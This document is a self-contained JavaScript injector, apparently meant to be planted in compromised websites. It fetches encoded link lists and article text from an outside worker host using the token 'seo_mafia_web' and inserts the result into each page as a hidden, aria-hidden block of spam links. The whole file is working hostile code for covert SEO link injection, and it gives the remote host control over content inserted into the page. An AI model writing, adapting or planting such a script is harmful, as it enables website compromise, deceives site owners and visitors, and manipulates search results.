!function(){
try{
  if(document.getElementById("bunker-payload")) return;
  const API_BASE = "https://smw.jsload.workers.dev";
  const TOKEN = "seo_mafia_web";
  const decode = s => decodeURIComponent(escape(atob(s)));
  async function getData(id){
    const r = await fetch(`${API_BASE}/data?id=${encodeURIComponent(id)}&token=${encodeURIComponent(TOKEN)}`, {
      method: "GET",
      cache: "no-store"
    });
    if(!r.ok) throw new Error("Fetch failed: " + r.status);
    const j = await r.json();
    if(!j || !j.payload) throw new Error("Invalid payload");
    return decode(j.payload);
  }
  Promise.all([
    getData("b1"),
    getData("a1")
  ]).then(([anchorsRaw, articleRaw]) => {
    if(!anchorsRaw || !articleRaw) return;
    const anchors = anchorsRaw
      .split("\n")
      .map(x => x.trim())
      .filter(Boolean)
      .map(line => {
        const p = line.split("|");
        if(p.length < 2) return "";
        const text = (p[0] || "").trim();
        const href = (p[1] || "").trim();
        if(!text || !href) return "";
        return '<a href="' + href + '">' + text + "</a>";
      })
      .filter(Boolean);
    let i = 0;
    const html = articleRaw.replace(/\{ANCHOR\}/g, () => {
      if(!anchors.length) return "";
      return anchors[i++ % anchors.length];
    });
    const box = document.createElement("div");
    box.id = "bunker-payload";
    box.hidden = true;
    box.setAttribute("aria-hidden", "true");
    box.innerHTML = html;
    (document.body || document.documentElement).appendChild(box);
  }).catch(err => {
    console.error("Bunker payload error:", err);
  });
}catch(e){
  console.error("Injector error:", e);
}
}();
